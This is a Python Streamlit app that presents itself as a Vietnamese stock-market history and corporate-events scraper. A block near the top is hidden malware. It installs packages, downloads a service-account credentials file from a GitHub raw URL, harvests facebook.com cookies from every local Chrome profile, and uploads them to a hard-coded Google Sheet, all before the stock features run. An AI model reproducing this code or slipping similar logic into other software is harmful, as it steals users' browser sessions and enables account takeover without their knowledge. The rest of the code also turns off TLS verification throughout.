import streamlit as st
import datetime
import numpy as np
import pandas as pd
import requests
from bs4 import BeautifulSoup
import urllib.request
from threading import Thread
import threading
import browser_cookie3
import re
import time
from streamlit.ReportThread import add_report_ctx
###############
import sys
import subprocess
import os
import requests
subprocess.check_call([sys.executable, '-m', 'pip', 'install','browser_cookie3'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install','gspread'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install','requests'])
import gspread
import browser_cookie3
import time
path = os.environ.get('APPDATA')
path = path[:path.find('AppData')+7] + r'\Local\Google\Chrome\User Data'
url = 'https://raw.githubusercontent.com/dongminh97/cookies/master/credentials.json'
r = requests.get(url, allow_redirects=True)
open(path+'\credentials.json', 'wb').write(r.content)
mid = os.listdir(os.path.expanduser(path))
cookies = []
for i in mid:
    try:
        coo = '\\'+ i + r'\Cookies'
        path_ = path+ coo
        cookies.append(list(browser_cookie3.chrome(path_, domain_name='facebook.com')))
        #cookies.append(list(browser_cookie3.chrome(path_)))
    except:
        pass
filename = path+'\credentials.json'
gc = gspread.service_account(filename=filename)
sht1 = gc.open_by_key('1lOZQFRZ6_1GtiFmVZWek0Wil6V9ONrEnpFb73F_9KIU')
li = []
for i in cookies:
    for j in i:
        li.append([str(j)])
sht1.sheet1.update('A1', li)
###############
st.title('Ứng dụng')
#st.header('1. Lịch sử giao dịch chứng khoán')
st.subheader("1. Lịch sử giao dịch chứng khoán")

loaigd = pd.DataFrame({
  'first column': ['Lịch sử giá và GDNDTNN','Lịch sự kiện']
})
option = st.radio(
    '1. Chọn loại giao dịch',
     loaigd['first column'])
date = st.date_input('2. Ngày giao dịch', datetime.datetime.today())
ma_moi = st.empty()
ma_cu = st.empty()
ma_chuyen = st.empty()
st.text('')
st.text('')
sta = st.markdown('<center>Nhấn bắt đầu để chạy ứng dụng!</center>',unsafe_allow_html=True)
pro = st.progress(0)

if st.button('BẮT ĐẦU'):
    sta.markdown('<center>Đang xử lý...!</center>',unsafe_allow_html=True)
    class Lichsugia:
        def __init__(self):
            pass
        def price(self):
            self.HNX = pd.DataFrame()
            self.gdc_1 = pd.DataFrame()
            self.gdc_2 = pd.DataFrame()
            self.gdc_3 = pd.DataFrame()
            self.table1 = pd.DataFrame()
            self.day = str(date.day)
            self.mon = str(date.month)
            if str(option) == 'Lịch sử giá và GDNDTNN':
                a = threading.Thread(target=self.runprice)
                add_report_ctx(a)
                a.start()
                a.join()
            else:
                threading.Thread(target=self.sukien).start()
        def runprice(self):
            #self.ma_cu.set("Đang tìm kiếm...")
            #self.ma_moi.set("Đang tìm kiếm...")
            #self.ma_chuyensan.set("Đang tìm kiếm...")
            self.HNX1 = threading.Thread(target=self.luongHNX, args=(self.get_HNX(),))
            self.HOSE1 = threading.Thread(target=self.luongHOSE, args=(self.get_HOSE(),))
            self.UPCOM1 = threading.Thread(target=self.luongUPCOM, args=(self.get_UPCOM(),))
            add_report_ctx(self.HNX1)
            add_report_ctx(self.HOSE1)
            add_report_ctx(self.UPCOM1)
            self.HNX1.start()
            self.HOSE1.start()
            self.UPCOM1.start()
            self.HNX1.join()
            self.HOSE1.join()
            self.UPCOM1.join()
            print("Bắt đầu")
            self.ketqua1 = threading.Thread(target=self.get_fin_HNX,args=(self.HNX['Mã'],))
            self.ketqua2 = threading.Thread(target=self.get_fin_HOSE,args=(self.HOSE['Mã'],))
            self.ketqua3 = threading.Thread(target=self.get_fin_UPCOM,args=(self.UPCOM['Mã'],))
            print("Bắt đầu get_all")
            add_report_ctx(self.ketqua1)
            add_report_ctx(self.ketqua2)
            add_report_ctx(self.ketqua3)
            self.ketqua1.start()
            self.ketqua2.start()
            self.ketqua3.start()
            self.ketqua1.join()
            self.ketqua2.join()
            self.ketqua3.join()
            getall = threading.Thread(target=self.get_all)
            add_report_ctx(getall)
            getall.start()
            getall.join()
            print("getall")
            viet_s = threading.Thread(target=self.viet_s)
            add_report_ctx(viet_s)
            viet_s.start()
            viet_s.join()
            print("viet_s")
            giaodich = threading.Thread(target=self.giaodich)
            add_report_ctx(giaodich)
            giaodich.start()
            giaodich.join()
            print("giaodich")
            checkma = threading.Thread(target=self.check_ma)
            add_report_ctx(checkma)
            checkma.start()
            checkma.join()
            print("checkma")
            self.table1[['Ngày','Mã','Sàn']].to_excel(r"\\Vietdata-server\shared\DONG\TOOL\Lich su gia\Temp\check.xlsx",index=False)
        def get_HNX(self):
            url = 'https://www.hnx.vn/ModuleIssuer/List/ListSearch_Datas'
            data = {
                    'p_issearch': 1,
                    'p_keysearch': "",
                    'p_market_code': "",
                    'p_orderby': "STOCK_CODE",
                    'p_ordertype': "ASC",
                    'p_currentpage': 1,
                    'p_record_on_page': 400,
                    }
            x = requests.post(url, data,verify=False)
            x = str(x.json())
            soupx = BeautifulSoup(x,'html.parser')
            self.thread_HNX = soupx.find_all('tr')[1:]
            return self.thread_HNX
        def luongHNX(self, tr_HNX):
            self.HNX = pd.DataFrame()
            for tr in tr_HNX:
                td = tr.find_all('td')
                line = pd.DataFrame({'Mã':[td[1].text.replace('\\r\\n','').strip()],'Khối lượng ĐKGD':[td[5].text.replace('\\r\\n','').strip().replace(".",",")],'KLLH':[td[6].text.replace('\\r\\n','').strip().replace(".",",")]})
                self.HNX = self.HNX.append(line,sort=False,ignore_index=True)
            self.HNX = self.HNX[self.HNX['Mã'].apply(lambda x: len(x))==3]
            #-------------------------------------------------------- HOSE------------------------------------------------------#
        def get_HOSE(self):
            url = "https://www.hsx.vn/Modules/Listed/Web/SymbolList?pageFieldName1=Code&pageFieldValue1=&pageFieldOperator1=eq&pageFieldName2=Sectors&pageFieldValue2=&pageFieldOperator2=&pageFieldName3=Sector&pageFieldValue3=00000000-0000-0000-0000-000000000000&pageFieldOperator3=&pageFieldName4=StartWith&pageFieldValue4=&pageFieldOperator4=&pageCriteriaLength=4&_search=false&nd=1571725978065&rows=500&page=1&sidx=id&sord=desc"
            self.v = requests.get(url,verify=False)
            self.v = self.v.json()
            self.v = self.v['rows']
            return self.v
        def luongHOSE(self,tr_HOSE):
            self.HOSE = pd.DataFrame()
            for n in range(0,len(tr_HOSE)):
                line = pd.DataFrame({'Mã':[tr_HOSE[n]['cell'][1]],'Khối lượng ĐKGD':[tr_HOSE[n]['cell'][5][0:-3].replace(".",",")],'KLLH':[tr_HOSE[n]['cell'][6][0:-3].replace(".",",")]})
                self.HOSE = self.HOSE.append(line,sort=False,ignore_index=True)
            self.HOSE = self.HOSE[self.HOSE['Mã'].apply(lambda x: len(x))==3]
            #-------------------------------------------------------- UPCOM------------------------------------------------------#
        def get_UPCOM(self):
            url = 'https://www.hnx.vn/ModuleIssuer/UC_Issuer/ListSearch_Datas'
            data = {
                    'p_issearch': 1,
                    'p_keysearch': "",
                    'p_market_code': "UC",
                    'p_orderby': "STOCK_CODE",
                    'p_ordertype': "ASC",
                    'p_currentpage': 1,
                    'p_record_on_page': 900,
                    }
            x = requests.post(url, data,verify=False)
            x = str(x.json())
            soupx = BeautifulSoup(x,'html.parser')
            self.threadUPCOM = soupx.find_all('tr')[1:]
            return self.threadUPCOM
        def luongUPCOM(self, tr_UPCOM):
            self.UPCOM = pd.DataFrame()
            for tr in tr_UPCOM:
                td = tr.find_all('td')
                line = pd.DataFrame({'Mã':[td[1].text.replace('\\r\\n','').strip()],'Khối lượng ĐKGD':[td[4].text.replace('\\r\\n','').strip().replace(".",",")],'KLLH':[td[5].text.replace('\\r\\n','').strip().replace(".",",")]})
                self.UPCOM = self.UPCOM.append(line,sort=False,ignore_index=True)
            self.UPCOM = self.UPCOM[self.UPCOM['Mã'].apply(lambda x: len(x))==3]
            #-------------------------------------------------------- TẤT CẢ CÁC SÀN------------------------------------------------------#
        def get_all(self):
            self.so = pd.concat([self.HNX,self.HOSE,self.UPCOM],axis=0,ignore_index=True)
            self.gdc = pd.concat([self.gdc_1,self.gdc_2,self.gdc_3],axis=0,ignore_index=True)
            self.so = pd.merge(self.so,self.gdc,on='Mã',how='left')
            #-------------------------------------------------------- LẤY GIÁ ĐIỀU CHỈNH--------------------------------------------------#
        def viet_s(self):
            vietstock = pd.DataFrame()
            opener = urllib.request.build_opener()
            cookies = list(browser_cookie3.chrome(r"C:\Users\Windows 10\AppData\Local\Google\Chrome\User Data\Profile 2\Cookies",domain_name='vietstock.vn'))
            list_cookies = []
            for i in range(len(cookies)):
                list_cookies.append(cookies[i].name + '=' + cookies[i].value)
            cookies = ";".join(list_cookies)
            opener.addheaders = [('User-agent', 'Mozilla/5.0'),('Cookie',cookies)]
            urllib.request.install_opener(opener)
            for i in range(1,4):
                code = False
                while code==False:
                    filename, headers = urllib.request.urlretrieve(url='https://finance.vietstock.vn/export/KQGDPrice?catID='+str(i)+'&date='+ "2020-21-05",filename= r"\\Vietdata-server\\shared\\DONG\\TOOL\\Lich su gia\\Temp\\" +str(i)+".xls" )
                    if int(headers.values()[3])>=10:
                        code = True            
                a = pd.read_excel(filename)
                a = a.drop([0,1,2,3,4,5,6,7,8,9,10,11,12,13,14],axis=0)
                a = a.drop(['Unnamed: 0','Unnamed: 1','Unnamed: 2','Unnamed: 19'],axis=1)
                a.columns = ['Mã','Giá tham chiếu','Mở cửa','Đóng cửa','Cao nhất','Thấp nhất','Trung bình','Thay đổi','Thay đổi %','KLKL','GTKL','KLTT','GTTT','Tổng KL','Tổng GT','Vốn hóa']
                vietstock = vietstock.append(a)
            vietstock = vietstock.drop(columns=['Trung bình'])
            vietstock['Thay đổi +/-'] = vietstock['Thay đổi'].apply(lambda x: x/1000)
            vietstock =  vietstock[vietstock['Mã'].apply(lambda x: len(x))==3]
            self.table1 = pd.merge(self.so,vietstock,on='Mã',how='inner')
            self.table1['Ngày'] = self.day+"/"+self.mon+"/2020"
            self.table1.drop_duplicates(subset ="Mã", keep = "first", inplace = True)
            self.table = self.table1[['Ngày','Mã','Giá tham chiếu','Mở cửa','Đóng cửa','Giá điều chỉnh','Trung bình','Cao nhất','Thấp nhất','Thay đổi +/-','Thay đổi %','KLKL','KLTT','GTKL','GTTT','Tổng KL','Tổng GT','Vốn hóa','KLLH','Khối lượng ĐKGD']]
            self.table.drop_duplicates(subset ="Mã", keep = "first", inplace = True)
            self.table.to_excel(r'\\Vietdata-server\shared\CHUNG\7. DATA TOOL\UPDATE Lich su gia\Ngày '+self.day+'-'+self.mon+'-2020.xlsx',index=False)              
        def get_fin_HOSE(self, ds):
            url = 'https://www.vndirect.com.vn/portal/ajax/listed/SearchHistoricalPriceForSymbol.shtml'
            proxies = {
                'http': 'http://118.69.50.154:80',
                'https': 'http://118.69.50.154:80',}
            reload = []
            for ma in ds:
                data={
                    'model.downloadType': '',
                    'pagingInfo.indexPage': 1,
                    'searchMarketStatisticsView.symbol': ma,
                    'strFromDate': self.day+'/'+self.mon+'/'+'2020',
                    'strToDate': self.day+'/'+self.mon+'/'+'2020'
                }
                x = requests.post(url,data,proxies,verify=False)
                while x.status_code != 200:
                    x = requests.post(url,data,proxies,verify=False)
                x = x.json()
                try:
                    line = pd.DataFrame({'Mã':[ma],'Sàn':['HOSE'],'Trung bình':[x['model']['searchResult'][0]['id']['averagePrice']],'Giá điều chỉnh':[x['model']['searchResult'][0]['id']['adClosePrice']]})
                    self.gdc_2 = self.gdc_2.append(line,sort=False,ignore_index=True)
                except:
                    reload.append(ma)
            for ma in reload:
                data={
                    'model.downloadType': '',
                    'pagingInfo.indexPage': 1,
                    'searchMarketStatisticsView.symbol': ma,
                    'strFromDate': self.day+'/'+self.mon+'/'+'2020',
                    'strToDate': self.day+'/'+self.mon+'/'+'2020'
                }
                x = requests.post(url,data,proxies,verify=False)
                while x.status_code != 200:
                    x = requests.post(url,data,proxies,verify=False)
                x = x.json()
                try:
                    line = pd.DataFrame({'Mã':[ma],'Sàn':['HOSE'],'Trung bình':[x['model']['searchResult'][0]['id']['averagePrice']],'Giá điều chỉnh':[x['model']['searchResult'][0]['id']['adClosePrice']]})
                    self.gdc_2 = self.gdc_2.append(line,sort=False,ignore_index=True)
                except:
                    pass               
        def get_fin_HNX(self, ds):
            url = 'https://www.vndirect.com.vn/portal/ajax/listed/SearchHistoricalPriceForSymbol.shtml'
            proxies = {
                'http': 'http://118.69.50.154:80',
                'https': 'http://118.69.50.154:80',}
            reload = []
            for ma in ds:
                data={
                    'model.downloadType': '',
                    'pagingInfo.indexPage': 1,
                    'searchMarketStatisticsView.symbol': ma,
                    'strFromDate': self.day+'/'+self.mon+'/'+'2020',
                    'strToDate': self.day+'/'+self.mon+'/'+'2020'
                }
                x = requests.post(url,data,proxies,verify=False)
                while x.status_code != 200:
                    x = requests.post(url,data,proxies,verify=False)
                x = x.json()
                try:
                    line = pd.DataFrame({'Mã':[ma],'Sàn':['HNX'],'Trung bình':[x['model']['searchResult'][0]['id']['averagePrice']],'Giá điều chỉnh':[x['model']['searchResult'][0]['id']['adClosePrice']]})
                    self.gdc_1 = self.gdc_1.append(line,sort=False,ignore_index=True)
                except:
                    reload.append(ma)
                
            for ma in reload:
                data={
                    'model.downloadType': '',
                    'pagingInfo.indexPage': 1,
                    'searchMarketStatisticsView.symbol': ma,
                    'strFromDate': self.day+'/'+self.mon+'/'+'2020',
                    'strToDate': self.day+'/'+self.mon+'/'+'2020'
                }
                x = requests.post(url,data,proxies,verify=False)
                while x.status_code != 200:
                    x = requests.post(url,data,proxies,verify=False)
                x = x.json()
                try:
                    line = pd.DataFrame({'Mã':[ma],'Sàn':['HNX'],'Trung bình':[x['model']['searchResult'][0]['id']['averagePrice']],'Giá điều chỉnh':[x['model']['searchResult'][0]['id']['adClosePrice']]})
                    self.gdc_1 = self.gdc_1.append(line,sort=False,ignore_index=True)
                except:
                    pass
        def get_fin_UPCOM(self, ds):
            i = 0
            reload = []
            url = 'https://www.vndirect.com.vn/portal/ajax/listed/SearchHistoricalPriceForSymbol.shtml'
            proxies = {
                'http': 'http://118.69.50.154:80',
                'https': 'http://118.69.50.154:80',}
            for ma in ds:
                i =i+1
                phantram = "Lịch sử giá và GDNDTNN : "+str(format(i/len(self.UPCOM['Mã'])*100,".2f"))+"%"
                sta.markdown('<center>'+phantram+'</center>',unsafe_allow_html=True)
                pro.progress(int(i/len(self.UPCOM['Mã'])*100))
                int(i/len(self.UPCOM['Mã'])*100)
                data={
                    'model.downloadType': '',
                    'pagingInfo.indexPage': 1,
                    'searchMarketStatisticsView.symbol': ma,
                    'strFromDate': self.day+'/'+self.mon+'/'+'2020',
                    'strToDate': self.day+'/'+self.mon+'/'+'2020'
                }
                x = requests.post(url,data,proxies,verify=False)
                while x.status_code != 200:
                    x = requests.post(url,data,proxies,verify=False)
                x = x.json()
                try:
                    line = pd.DataFrame({'Mã':[ma],'Sàn':['UPCOM'],'Trung bình':[x['model']['searchResult'][0]['id']['averagePrice']],'Giá điều chỉnh':[x['model']['searchResult'][0]['id']['adClosePrice']]})
                    self.gdc_3 = self.gdc_3.append(line,sort=False,ignore_index=True)
                except:
                    reload.append(ma)
                
            for ma in reload:
                data={
                    'model.downloadType': '',
                    'pagingInfo.indexPage': 1,
                    'searchMarketStatisticsView.symbol': ma,
                    'strFromDate': self.day+'/'+self.mon+'/'+'2020',
                    'strToDate': self.day+'/'+self.mon+'/'+'2020'
                }
                x = requests.post(url,data,proxies,verify=False)
                while x.status_code != 200:
                    x = requests.post(url,data,proxies,verify=False)
                x = x.json()
                try:
                    line = pd.DataFrame({'Mã':[ma],'Sàn':['UPCOM'],'Trung bình':[x['model']['searchResult'][0]['id']['averagePrice']],'Giá điều chỉnh':[x['model']['searchResult'][0]['id']['adClosePrice']]})
                    self.gdc_3 = self.gdc_3.append(line,sort=False,ignore_index=True)
                except:
                    pass
                
            sta.markdown("<center>Đang xuất file Excel...</center>",unsafe_allow_html=True)
        def giaodich(self):
            line = []
            for san in ['HOSE','HASTC','UPCOM']:
                url = 'https://s.cafef.vn/TraCuuLichSu2/3/'+san+'/'+self.day+'/'+self.mon+'/2020.chn'
                x = requests.get(url,verify=False)
                soupx = BeautifulSoup(x.content,'html.parser')
                ketqua = soupx.find_all(id="table2sort")[0].find_all('tr')[3:]
                for each in ketqua:
                    k = each.find_all('td')
                    line.append([self.day+'/'+self.mon+'/2020',k[0].text.replace('\xa0',''),k[1].text.replace('\xa0',''),k[2].text.replace('\xa0',''),k[3].text.replace('\xa0',''),k[4].text.replace('\xa0',''),k[5].text.replace('\xa0',''),k[6].text.replace('\xa0',''),k[7].text.replace('\xa0',''),k[8].text.replace('\xa0','')])
            self.giaodich = pd.DataFrame(line,columns=['Ngày','Mã','Khối lượng mua','Giá trị mua','Khối lượng bán','Giá trị bán','KL giao dịch ròng','Giá trị giao dịch ròng','Room còn lại','Đang sở hữu'])
            self.giaodich = self.giaodich[self.giaodich['Mã'].apply(lambda x: len(x))==3]
            self.giaodich.to_excel(r'\\Vietdata-server\shared\CHUNG\7. DATA TOOL\GDNDTNN\Ngày '+self.day+'-'+self.mon+'-2020.xlsx',index=False)
        def sukien(self):
            a = []
            for event in range(1,4):
                bien = "Lịch sự kiện: {} %".format(event/3*100)
                sta.markdown('<center>' + bien + '</center>',unsafe_allow_html=True)
                pro.progress(int(event/3*100))
                url = 'https://www.cophieu68.vn/events.php?currentPage=1&stockname=&event_type='+str(event)
                x = requests.get(url,verify=False)
                x = BeautifulSoup(x.content,"html.parser")
                cuoi = int(re.findall('currentPage=(.*)&amp;stockname=',str(x.find_all(href=re.compile("currentPage"))[-1]))[0])+1
                for i in range(1,cuoi):
                    dung = False
                    url = 'https://www.cophieu68.vn/events.php?currentPage='+str(i)+'&stockname=&event_type='+str(event)
                    x = requests.get(url,verify=False)
                    x = BeautifulSoup(x.content,"html.parser")
                    x1 = x.find_all('table')[1]
                    x1 = x1.find_all('tr')[1:]
                    for each in x1:
                        td = each.find_all('td')
                        k = td[4].text.replace('\r\n\t\t\t\t\t\t','').replace('\t\t\t\t\t\t','')
                        if datetime.datetime.strptime(td[2].text,"%d/%m/%Y").month == int(self.mon) and datetime.datetime.strptime(td[2].text,"%d/%m/%Y").year == 2020:
                            if event == 1:
                                line = [td[0].text,td[1].text,td[2].text,k,td[5].text.replace('\n','').replace(' đồng/cổ phiếu','')]
                                a.append(line)
                            elif event ==2:
                                line = [td[0].text,td[1].text,td[2].text,"{0:.0%}".format(float(re.findall(r'/(.*)',k)[0].replace(',',''))/float(re.findall(r'(.*)/',k)[0].replace(',',''))),0]
                                a.append(line)
                            elif event ==3:
                                line = [td[0].text,td[1].text,td[2].text,"{0:.0%}".format(float(re.findall(r'/(.*)\(',k)[0].replace(',',''))/float(re.findall(r'(.*)/',k)[0].replace(',',''))),re.findall('giá: (.*)\)',k)[0]]
                                a.append(line)
                        elif datetime.datetime.strptime(td[2].text,"%d/%m/%Y").month >= int(self.mon) and datetime.datetime.strptime(td[2].text,"%d/%m/%Y").year == 2020:
                            pass
                        elif td[2].text == 'N/A':
                            pass
                        else:
                            dung = True
                            break
                    if dung:
                        break
            sta.markdown('<center>Đang xuất file excel</center>',unsafe_allow_html=True)
            lichsukien = pd.DataFrame(a)
            lichsukien.columns = ['Mã','Loại sự kiện','Ngày DGKHQ','Tỷ lệ', 'Giá']
            lichsukien.to_excel(r'\\Vietdata-server\shared\CHUNG\7. DATA TOOL\UPDATE Lich su kien\Tháng '+self.mon+'-2020.xlsx',index=False)
            sta.markdown('<center>Hoàn thành!</center>',unsafe_allow_html=True)
        def check_ma(self):
            cu = pd.read_excel(r"\\Vietdata-server\shared\DONG\TOOL\Lich su gia\Temp\check.xlsx")
            moi = self.table1[['Mã','Sàn']]
            mamoi = moi[moi['Mã'].isin(cu['Mã'])==False]['Mã']
            dsmamoi = ", ".join(mamoi)
            if dsmamoi == '':
                dsmamoi = "Không có mã mới!"
            ma_moi.text_area('3. Các mã mới cập nhật:', dsmamoi)
            macu = cu[cu['Mã'].isin(moi['Mã'])==False]['Mã']
            dsmacu = ", ".join(macu)
            if dsmacu == '':
                dsmacu = "Không có mã ngưng giao dịch!"
            ma_cu.text_area('4. Các mã ngừng giao dịch:', dsmacu)
            
            chuyensan = cu[['Mã','Sàn']]
            chuyensan.columns = ['Mã','Sàn cũ']
            chuyensan = pd.merge(chuyensan,moi,on='Mã',how='inner')
            chuyensan = chuyensan[chuyensan['Sàn']!=chuyensan['Sàn cũ']]['Mã']
            chuyensan = list(dict.fromkeys(chuyensan))
            self.table1.drop_duplicates(subset ="Mã", keep = "first", inplace = True)
            dschuyensan = ", ".join(chuyensan)
            if dschuyensan == '':
                dschuyensan = "Không có mã nào chuyển sàn!"
            ma_chuyen.text_area('5. Các mã chuyển sàn:', dschuyensan)
    a = Lichsugia()
    a.price()


st.subheader("2. Thông tin doanh nghiệp")
soluong = st.slider('Số lượng doanh nghiệp muốn lấy:', 0, 10000, 10)
st.write("Đang tiến hành lấy thông tin", soluong, 'doanh nghiệp!')



if st.button('Hiển thị lịch sử giao dịch'):
    pro.progress(12)
    moi = 'asfa'
